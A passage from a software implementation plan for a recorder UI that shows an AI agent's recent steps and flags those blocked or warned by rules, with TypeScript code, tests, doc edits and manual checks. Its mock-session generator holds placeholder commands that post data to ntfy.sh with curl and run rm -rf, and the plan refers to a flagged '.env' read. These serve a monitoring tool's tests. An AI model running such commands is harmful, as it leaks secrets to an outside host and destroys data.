      return step(order, { verdict: 'blocked', command: 'curl -d <arg> ntfy.sh', host: 'ntfy.sh', rule: 'R1' })
    }
    if (i >= 2 && i % 31 === 0) return step(order, { verdict: 'warned', command: 'rm -rf <arg>', rule: 'R2' })
    return step(order, FILLER[i % FILLER.length])
  })
}

/** `?len=N` makes mock mode replay N steps (1 to 2000); anything else means the default session. */
export function parseLen(raw: string | null): number | null {
  const n = Number(raw)
  return raw !== null && raw !== '' && Number.isInteger(n) && n >= 1 && n <= LONG_MAX ? n : null
}
```

- [ ] **Step 5: Use it in `useRecorder.ts` and `App.tsx`**

In `useRecorder.ts` change the imports:

```ts
import { LONG_MARKED_ORDER, MOCK_MARKED_ORDER, MOCK_SESSION, longSession } from './mock'
import { MOCK_CAP, windowOfMock } from './mockWindow'
```

Change the signature and its doc comment tail:

```ts
export function useRecorder(mock: boolean, burst = 1, mockFirst = false, mockLen: number | null = null): Recorder {
```

(add to the doc comment: "`mockLen` replays a generated session of that many steps instead of MOCK_SESSION. Mock polls go through `windowOfMock`, so they have the server's shape: the last 20 steps, `hidden`, `flagged`, the marking step.")

Replace the mock effect:

```ts
  useEffect(() => {
    if (!mock) return
    const session = `mock-${mockRun}`
    const source = mockLen === null ? MOCK_SESSION : longSession(mockLen)
    const marked = mockLen === null ? MOCK_MARKED_ORDER : LONG_MARKED_ORDER
    let shown = 0
    function tick(): void {
      shown = Math.min(shown + burst, source.length)
      const first = firstMockTick.current
      firstMockTick.current = false
      const win = windowOfMock(source.slice(0, shown), WINDOW_SIZE, MOCK_CAP, marked)
      dispatch({
        type: 'snapshot',
        session,
        steps: win.steps,
        hidden: win.hidden,
        flagged: win.flagged,
        markedOrder: win.markedOrder,
        first,
      })
      if (shown >= source.length) clearInterval(timer)
    }
    const timer = setInterval(tick, MOCK_INTERVAL_MS)
    tick()
    return () => clearInterval(timer)
  }, [mock, mockRun, burst, mockLen])
```

In `App.tsx`: `import { parseBurst, parseLen } from './graph/mock'`, then

```tsx
  const mockLen = mock ? parseLen(params.get('len')) : null
  const { steps, group, markedOrder, epoch, secretSeen, offline, newSession } = useRecorder(mock, burst, mockFirst, mockLen)
```

Add an App test in `App.test.tsx`:

```tsx
  it('/?mock=1&len=60&burst=10 replays a generated long session and shows its group', async () => {
    window.history.replaceState({}, '', '/?mock=1&len=60&burst=10')
    vi.stubGlobal('fetch', vi.fn())
    render(<App />)
    await advance(1500 * 6)
    expect(screen.getByText(/^\d+ earlier steps/)).toBeTruthy()
    expect(screen.getByText('SECRET SEEN')).toBeTruthy()
  })
```

- [ ] **Step 6: Run the web check**

Run: `npm --prefix ui run check`
Expected: pass. If an existing mock-mode test in `useRecorder.test.tsx` or `App.test.tsx` fails because the default 34-step session now draws a group once more than 20 steps have been shown, update only its expectations (count of boxes or text) and keep its intent.

- [ ] **Step 7: Commit**

```bash
git add ui/src
git commit -m "$(cat <<'EOF'
AG-30: give mock mode the server's window shape and a long session

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 7: Docs, build and manual checks

**Files:**
- Modify: `README.md`, `ui/README.md`, `SPEC.md` § 6
- Rebuild and commit: `ui/dist`

**Interfaces:** none produced. Consumes everything above.

- [ ] **Step 1: `README.md`**

Replace

```
<http://127.0.0.1:8787/v2/>: a timeline with steps on the left, files in the
middle and hosts and rules on the right, drawing the last 20 steps it has
seen. `/v2/?mock=1` replays a sample session with no server.
```

with

```
<http://127.0.0.1:8787/v2/>: a timeline with steps on the left, files in the
middle and hosts and rules on the right, drawing the 20 most recent steps. In
a long session a summary box above them counts the earlier steps, with up to 5
flagged ones (the step that made R1 mark the session, and the newest blocks and
warnings) one pan upward. `/v2/?mock=1` replays a sample session with no server
(`&len=500&burst=10` replays a long one).
```

- [ ] **Step 2: `ui/README.md`**

Replace

```
lane, hosts and rules in the right lane. At most 20 steps are drawn, from the
steps the page has seen (the API returns the last 10 per poll). The camera
```

with

```
lane, hosts and rules in the right lane. The page asks for
`/api/steps?limit=20` and draws those 20 steps; above them a summary box counts
the earlier steps ("38 earlier steps (2 blocked): 20 read, 16 shell") with up to
5 flagged older steps joined to it in a column. At most 15 file and host boxes
and 5 rule boxes are drawn. The group moves with the window and never animates.
The server keeps at most 500 steps per session (see `HOOKS.md`). The camera
```

Replace

```
server; "New session" restarts it. The mock replays a 34-step session (enough
to slide the 20-step window); `?mock=1&burst=10` emits 10 steps per tick to
check bursts, and `&first=1` makes the first tick paint still, as after a
reload of the real page.
```

with

```
server; "New session" restarts it. The mock replays a 34-step session (enough
to slide the 20-step window and show a group) through the same window shape the
server returns (`hidden`, `flagged`, the marking step); `?mock=1&burst=10` emits
10 steps per tick to check bursts, `&len=500` replays a generated 500-step
session (a marking `.env` read, a block about every 13 steps), and `&first=1`
makes the first tick paint still, as after a reload of the real page.
```

- [ ] **Step 3: `SPEC.md` § 6**

Replace

```
  websites and rules in a lane further right. A file, website or rule is one
  box, level with the first drawn step that touches it. A blocked step is
  joined by a dashed red line to a box for its rule (a warned step by a dashed
  purple line).
- The new page draws the 20 most recent steps of the *current session* that it
  has seen (it keeps earlier steps between refreshes) and keeps the newest
  step in view unless the viewer has scrolled away; a Follow button returns.
```

with

```
  websites and rules in a lane further right. A file, website or rule is one
  box, level with the first drawn step that touches it; at most 15 file and
  website boxes and 5 rule boxes are drawn, and the one touched longest ago
  goes first. A blocked step is joined by a dashed red line to a box for its
  rule (a warned step by a dashed purple line); an older flagged step names its
  rule in its chip instead of a box.
- The new page draws the 20 most recent steps of the *current session*, as the
  server returns them, and above them one summary box that counts the earlier
  steps ("38 earlier steps (2 blocked): 20 read, 16 shell"). Up to 5 older
  flagged steps (the step that made R1 mark the session, and the newest blocked
  or warned ones) hang below the summary box, joined to it in a column. The page
  keeps the newest step in view unless the viewer has scrolled away; a Follow
  button returns.
```

- [ ] **Step 4: Full checks and rebuild**

Run:

```bash
uv run ruff check . && uv run ruff format --check . && uv run pytest -q
npm --prefix ui ci && npm --prefix ui run check
npm --prefix ui run build
```

Expected: all pass. `git status --porcelain ui/dist` now lists the rebuilt files.

- [ ] **Step 5: Commit the build and docs, then re-run the stale-build check**

```bash
git add README.md ui/README.md SPEC.md ui/dist
git commit -m "$(cat <<'EOF'
AG-30: document the window and summary box, rebuild ui/dist

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
npm --prefix ui run build && test -z "$(git status --porcelain ui/dist)" && echo "build is not stale"
```

Expected: `build is not stale`.

- [ ] **Step 6: Manual checks (required; record the result of each in the PR description)**

1. Start the recorder in a separate terminal: `uv run uvicorn recorder.app:app --host 127.0.0.1 --port 8787`.
2. Real session: `for i in $(seq 12); do uv run python fake_agent.py --session s1; done` (36 steps; a marking step at order 2, a block every third step). Open `http://127.0.0.1:8787/v2/`. Check: 20 steps, a summary box and flagged steps one pan up, `SECRET` on the marking step (also while it is in the window), SECRET SEEN. Reload mid-session: SECRET SEEN and the group come back, still. This is a window-slide and reload check, not the 500-step check.
3. `http://127.0.0.1:8787/v2/?mock=1&len=500&burst=10`: the tab stays responsive for the whole replay; at most about 50 boxes on screen.
4. A 400 px wide pane: the summary text and the chips on a flagged step truncate without hiding the BLOCKED/SECRET chips; the tooltip carries the full summary text.
5. A tall pane (over about 1,300 px), and a viewer scrolled up to the group while steps arrive (`&burst=1`): the group hop is visible and nothing replays a fade or an edge draw-in. This is accepted (spec § 6); do not try to fix it.
6. Stop the recorder: the OFFLINE banner appears; restart it and reload: `marked_order` is null, so the `SECRET` chip on the step is gone but a live `.env` read raises SECRET SEEN again.

If any manual check fails, fix it in the task that owns the code, re-run that task's checks, and rebuild `ui/dist`.

---

## Self-Review

**Spec coverage.** § 2 resolutions: group geometry and chain edges (Task 4 layout + tests), `limit` forms (Tasks 1 and 2), dropped lane box and tie-break (Task 4), marking step and the 5 slots (Task 1 `pick_flagged`, golden scenarios 3 and 4), the replay (Task 6 mock, Task 2 pytest, Task 7 manual). § 3 server: Task 1 (state, hook path, snapshot, restart in Task 2). § 4 API contract: Tasks 1 and 2 plus HOOKS.md. § 5 data in: Task 3. § 6 layout and camera: Task 4 (and `GraphView` in Task 5). § 7 nodes, chips, tones: Task 5. § 8 mock: Task 6. § 9 tests: each listed test sits in the task named above; the golden fixture runs in both Task 1 (pytest) and Task 6 (vitest). § 10 docs: HOOKS.md in Task 2; README, ui/README, SPEC § 6, `ui/dist` in Task 7; the Jira edit is already done. § 11 manual checks: Task 7 step 6. § 12 risks: carried, not coded.

**One deliberate deviation from the spec's wording.** The spec writes `rowsOf(steps, k = 0)` with `k` the number of drawn flagged steps. The plan passes `groupRowCount = 1 + k` (via `groupRows(steps, group)`), so a summary with no flagged step still moves the pan range. The behaviour the spec describes is unchanged.

**Placeholders.** None: every code step carries its code; the only "find it" instruction is the mock-mode `describe` name in `useRecorder.test.tsx` (Task 6 step 1), which the engineer reads from the file.

**Type consistency.** `Hidden`, `Group`, `Snapshot` (Task 3) are what Tasks 4 to 6 import. `layoutGraph(steps, group, markedOrder)`, `drawnFlagged`, `groupRows`, `SUMMARY_ID`, `groupEdgeId` (Task 4) are what Task 5 uses. `windowOfMock(all, limit, cap, markedOrder)` and `MockWindow.markedOrder` (Task 6) match the reducer action's `markedOrder`. Python: `append_step(session_id, step, marks)`, `snapshot(*, all_steps, limit)` (Task 1) are what Task 2 calls.
